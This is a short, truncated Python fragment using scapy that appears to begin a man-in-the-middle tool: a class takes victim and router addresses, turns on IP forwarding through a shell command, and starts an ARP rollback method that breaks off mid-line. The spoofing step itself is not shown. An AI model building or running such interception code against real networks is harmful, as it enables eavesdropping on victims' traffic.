from scapy.all import *
import sys, os, time

class do_mitm:
    def do_it_now(self,victim_ip, router_ip, victim_mac, router_mac, iface):
        print('Port forwarding...............')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')



    def rearping(self):
        print('Rolling back changes..............')
        sendp